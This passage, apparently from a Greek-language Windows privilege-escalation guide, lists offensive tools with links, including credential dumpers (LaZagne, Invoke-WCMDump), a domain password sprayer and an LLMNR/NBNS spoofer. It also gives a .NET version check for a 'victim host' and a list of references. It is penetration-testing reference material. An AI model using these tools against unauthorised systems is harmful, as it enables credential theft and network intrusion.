[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει πληροφορίες αποθηκευμένων session από PuTTY, WinSCP, SuperPuTTY, FileZilla, και RDP. Χρησιμοποιήστε -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει credentials από το Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray των συγκεντρωμένων passwords εντός domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh είναι ένα PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer και man-in-the-middle εργαλείο.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασική enumeration για privesc στα Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Αναζήτηση γνωστών privesc ευπαθειών (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Απαιτούνται δικαιώματα Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζήτηση γνωστών privesc ευπαθειών (χρειάζεται να μεταγλωττιστεί με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Εντοπίζει misconfigurations στο host (πιο πολύ εργαλείο συλλογής πληροφοριών παρά privesc) (χρειάζεται να μεταγλωττιστεί) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά προγράμματα (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Έλεγχος για misconfiguration (εκτελέσιμο precompiled στο github). Δεν συνιστάται. Δε δουλεύει καλά σε Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Έλεγχος για πιθανές misconfigurations (exe από python). Δεν συνιστάται. Δε δουλεύει καλά σε Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο βασισμένο σε αυτή την ανάρτηση (δεν χρειάζεται accesschk για να δουλέψει σωστά αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει διαθέσιμα exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει διαθέσιμα exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Αναφορές

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
